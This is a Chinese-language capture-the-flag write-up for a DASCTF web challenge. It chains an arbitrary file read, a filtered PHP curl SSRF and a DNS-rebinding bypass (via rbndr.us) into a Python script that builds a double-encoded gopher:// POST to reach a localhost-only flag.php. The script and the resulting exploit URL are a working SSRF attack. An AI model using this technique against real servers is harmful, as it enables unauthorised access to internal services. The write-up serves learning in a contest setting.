这一道 web1 还是挺有意思的，算是搞出来的一种非预期



是咋打的捏，首先有个任意文件读取的漏洞，可以读到 `etc/passwd`, `etc/hosts` 这些敏感文件，顺藤摸瓜找到了 `/etc/apache2/sites-enabled/000-default.conf`，在确认网站的根目录是 `var/www/html` 之后，读取 `index.php` 和 `flag.php`

**index.php**

```php
<?php
error_reporting(0);

if (!isset($_REQUEST['url'])){
    header("Location: /?url=_");
    exit;
}

$url=$_REQUEST['url'];
$x=parse_url($url);
if($x['scheme']==='gopher'||$x['scheme']==='file'){
    if(!preg_match('/localhost|127\.0\.|\。/i', $url)){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_exec($ch);
        curl_close($ch);
    }
    else{
        die('hacker');
    }
}
else{
    die('are you serious？');
}
?>
```

**flag.php**

```php
<?php
error_reporting(0);

$flag=getenv("DASFLAG");
$key = md5($flag);

if ($_SERVER["REMOTE_ADDR"] != "127.0.0.1") {
    echo "Just View From 127.0.0.1 \n";
    echo "\n";
    echo $key;
    return;
}

if (isset($_POST["key"]) && $_POST["key"] == $key) {
    echo $flag;
    exit;
}
?>
```

- 明显是要访问 flag.php 且让自己成为 localhost 的角色，这里一眼 SSRF



看 `index.php`，裸露的 SSRF 代码，但是过滤了一些关键字，这里一眼 DNS Rebinding，DNS Rebinding 怎么打这里就不说了，很基础。主要是这里是 gopher 配合 POST 发包



所以构造 EXP 如下



```python
import urllib.parse

payload = \
    """POST /flag.php HTTP/1.1
Host: 80.endpoint-5bc27f004802419d892ebf9f2e58b1ee.s.ins.cloud.dasctf.com:81
Content-Length: 36
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.51
Origin: http://80.endpoint-5bc27f004802419d892ebf9f2e58b1ee.s.ins.cloud.dasctf.com:81
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://80.endpoint-5bc27f004802419d892ebf9f2e58b1ee.s.ins.cloud.dasctf.com:81/flag.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,ja;q=0.5,zh-TW;q=0.4
Connection: close

key=88b10d0e29f73dbd92bf9be10ee3e34e
    """

# 注意后面一定要有回车，回车结尾表示http请求结束
tmp = urllib.parse.quote(payload)
new = tmp.replace('%0A', '%0D%0A')
result = '_' + new
result = urllib.parse.quote(result)
print('http://80.endpoint-5bc27f004802419d892ebf9f2e58b1ee.s.ins.cloud.dasctf.com:81/?url=gopher://7f000001.c0a80001.rbndr.us:80/'+result)  # 这里因为是GET请求所以要进行两次url编码
```



> 比较有意思的一道实战题



